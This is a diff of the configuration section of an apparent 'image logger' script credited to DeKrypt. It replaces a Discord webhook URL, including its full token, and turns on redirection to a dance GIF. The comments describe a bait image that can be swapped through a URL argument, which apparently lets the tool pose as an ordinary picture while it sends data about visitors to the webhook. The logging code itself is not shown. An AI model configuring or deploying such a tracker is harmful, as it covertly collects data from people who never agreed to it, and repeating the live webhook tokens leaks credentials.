@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1429380401180446882/7YO2k2hqJJK9-j93KzaAtBq5YXMT4Z2_hG7wsnhdWQzAFaDSVDzP1gCvgygCXeiEnOvv",
+    "webhook": "https://discord.com/api/webhooks/1433500173262389268/7evMAyvGY6o2k50o7Ea8oibvRDU3BkMPs_gx8HCzEwE2yqO3XhGcF1_oY1yohx8PWmMk",
     "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png?resize=1024%2C767&quality=50&strip=all", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://tenor.com/view/dance-moves-dancing-singer-groovy-gif-17029825" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
